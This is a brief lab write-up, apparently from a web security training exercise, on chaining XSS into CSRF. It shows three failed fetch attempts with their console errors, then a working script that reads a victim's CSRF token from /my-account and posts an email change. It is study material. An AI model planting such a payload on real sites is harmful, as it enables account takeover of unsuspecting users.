# Exploiting XSS to perform CSRF

## failed payloads
1. Promise { <state>: "rejected", <reason>: SyntaxError }
```html
<script>
    fetch("/my-account").then((res) => console.log(res.json())).catch((e) => console.log(e));
</script>
```

2. Promise { <state>: "pending" }
```html
<script>
    fetch("/my-account").then((res) => console.log(res)).catch((e) => console.log(e));
</script>
```

3. Promise { <state>: "pending" }   &&  undefined   &&  Uncaught (in promise) SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data
```html
<script>
    fetch("/my-account").then((res) => console.log(res.json())).then((data) => console.log(data)).catch((e) => console.log(e));
</script>
```

## success solution
```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

